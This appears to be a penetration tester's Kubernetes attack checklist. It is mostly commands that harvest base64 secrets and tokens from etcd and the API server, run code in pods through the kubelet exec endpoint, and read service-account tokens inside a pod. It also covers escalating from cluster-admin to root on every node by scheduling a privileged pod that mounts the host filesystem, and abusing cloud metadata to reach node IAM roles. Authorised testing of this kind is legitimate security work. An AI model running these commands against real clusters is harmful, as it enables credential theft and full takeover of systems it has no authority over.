# Kubernetes

## Before I start
- [ ] Port map: 6443/8443 API, 2379 etcd, 10250 kubelet, 8001 dashboard, 30000+ NodePorts
kube-hunter --remote <TargetIP>

## etcd (2379) — whole cluster in one store
etcdctl --endpoints=http://<TargetIP>:2379 get / --prefix --keys-only
etcdctl --endpoints=http://<TargetIP>:2379 get /registry/secrets --prefix
- [ ] Secrets are base64: SA tokens, registry creds, TLS keys — decode and harvest
- [ ] Writable etcd = poison any spec

## API server — anonymous access
curl -sk https://<TargetIP>:6443/api/v1/secrets
kubectl --server=https://<TargetIP>:6443 --insecure-skip-tls-verify get pods --all-namespaces
- [ ] system:anonymous with rights (legacy AlwaysAllow) = cluster-admin
- [ ] 403 default-deny → pivot to kubelet

## Kubelet (10250) — per-node exec
curl -sk https://<NodeIP>:10250/runningpods/ | jq
curl -sk -X POST "https://<NodeIP>:10250/exec/<ns>/<pod>/<container>?command=id&input=1&output=1&tty=1"
- [ ] kubeletctl automates scan-and-exec across nodes

## Inside a pod already
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=<SA-TOKEN> --server=https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i --list
- [ ] can-i get secrets in kube-system ≈ cluster-admin
- [ ] Cloud metadata from the pod → over-scoped node IAM roles

## Cluster-admin → host root
- [ ] Schedule privileged pod mounting / → chroot = root on every node: :Pb docker-api

## If it fails
- [ ] Everything authed → hunt SA tokens in repos/CI, exposed NodePort apps, dashboard without auth on 8001

## Next
- [ ] Node root → :Pb linux-creds
- [ ] Cloud/IAM creds → cloud enum; container escape → :Pb docker-lxd
